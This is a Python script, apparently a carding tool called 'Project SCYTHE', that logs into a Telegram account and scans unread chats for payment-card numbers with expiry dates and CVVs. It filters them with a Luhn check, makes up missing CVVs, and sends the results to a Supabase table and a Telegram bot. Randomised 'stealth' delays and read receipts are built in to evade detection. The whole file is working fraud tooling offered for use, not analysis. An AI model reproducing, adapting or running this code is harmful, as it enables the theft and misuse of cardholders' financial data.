import os
import re
import asyncio
import tempfile
import requests
import random
from datetime import datetime
from telethon import TelegramClient
from telethon.sessions import StringSession
from supabase import create_client, Client
from dotenv import load_dotenv
from state_manager import StateManager

# Load configuration
load_dotenv('local_secrets.env')

# --- CONFIGURATION ---
API_ID = os.getenv('API_ID')
API_HASH = os.getenv('API_HASH')
SESSION_STRING = os.getenv('SESSION_STRING')
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
SUPABASE_URL = os.getenv('SUPABASE_URL')
SUPABASE_KEY = os.getenv('SUPABASE_SECRET_KEY')

# Stealth Params
BATCH_CHAT_LIMIT = random.randint(4, 8)
MESSAGE_PROCESS_LIMIT = random.randint(15, 25)
MIN_DELAY = 10.0
MAX_DELAY = 30.0
CHAT_TRANSITION_DELAY = (1, 3) # Minutes
SYNC_THRESHOLD_HOURS = 12 # Only send to Bot/Supabase every 12 hours

# Regex for card patterns
CARD_REGEX = r'(\d{14,16}\|\d{1,2}\|\d{2,4}(?:\|\d{3,4})?\|?)'

state = StateManager()

def is_luhn_valid(number):
    digits = [int(d) for d in str(number)]
    checksum = 0
    reverse_digits = digits[::-1]
    for i, d in enumerate(reverse_digits):
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        checksum += d
    return checksum % 10 == 0

async def human_delay():
    await asyncio.sleep(random.uniform(MIN_DELAY, MAX_DELAY))

async def sync_to_targets(cards):
    print(f"Propagating {len(cards)} vectors to Command Center...")
    # 1. Supabase Sync
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
    for card in cards:
        try:
            supabase.table("cards").upsert({"card_data": card}).execute()
        except: pass
    
    # 2. Telegram Bot File
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        with tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False) as tmp:
            tmp.write("\n".join(cards))
            tmp_path = tmp.name
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(tmp_path, 'rb') as f:
            files = {'document': ('ghost_vectors.txt', f)}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"🎯 GHOST: {len(cards)} Intelligence Vectors Synced."}
            requests.post(url, data=data, files=files)
        os.unlink(tmp_path)

async def cloud_mission():
    print("--- [ Project SCYTHE: CLOUD GHOST MODE ] ---")
    
    if not SESSION_STRING:
        print("Error: SESSION_STRING missing.")
        return

    # Initialize Client
    client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        print("Session Invalid.")
        return
        
    print("Cloud Session Authenticated.")

    all_dialogs = []
    async for d in client.iter_dialogs():
        if d.unread_count > 0:
            all_dialogs.append(d)
    
    random.shuffle(all_dialogs)
    targets = all_dialogs[:BATCH_CHAT_LIMIT]
    
    new_cards = []
    
    for dialog in targets:
        last_id = state.get_last_id(dialog.id)
        print(f"Scrubbing: {dialog.name}")
        
        processed = 0
        current_max = last_id
        
        async for msg in client.iter_messages(dialog.id, min_id=last_id, limit=MESSAGE_PROCESS_LIMIT):
            processed += 1
            if msg.id > current_max: current_max = msg.id
            
            if msg.text:
                matches = re.findall(CARD_REGEX, msg.text)
                for card in matches:
                    parts = card.split('|')
                    if len(parts) >= 3:
                        card_num = parts[0].strip()
                        if not is_luhn_valid(card_num): continue
                        if not (card_num.startswith('4') or card_num.startswith('5')): continue
                        
                        year = parts[2].strip()
                        if len(year) == 2: parts[2] = "20" + year
                        
                        if len(parts) < 4 or not parts[3].strip():
                            parts.append("".join([str(random.randint(0, 9)) for _ in range(3)]))
                        
                        card = "|".join([p.strip() for p in parts if p.strip()])
                        new_cards.append(card)
            
            if processed < MESSAGE_PROCESS_LIMIT:
                await human_delay()

        state.update_last_id(dialog.id, current_max)
        if random.random() > 0.4:
            await client.send_read_acknowledge(dialog.id, max_id=current_max)

        if len(new_cards) > 0:
            state.stage_cards(new_cards)
            new_cards = []

        # Inter-target delay
        await asyncio.sleep(random.uniform(CHAT_TRANSITION_DELAY[0]*60, CHAT_TRANSITION_DELAY[1]*60))

    # Decide if we BROADCAST based on time or random chance (12-hour sync simulation)
    # Check staged cards
    staged = state.get_staged_cards()
    if staged:
        # For Cloud Mission, we check if it's been ~12 hours since last sync or use a random flag
        # Simplification: 30% chance to sync on any given run, ensuring it averages out
        if random.random() > 0.7 or len(staged) > 50:
            await sync_to_targets(staged)
            state.clear_staged_cards()
        else:
            print(f"Staging maintained: {len(staged)} vectors awaiting next broadcast cycle.")

    await client.disconnect()

if __name__ == '__main__':
    asyncio.run(cloud_mission())
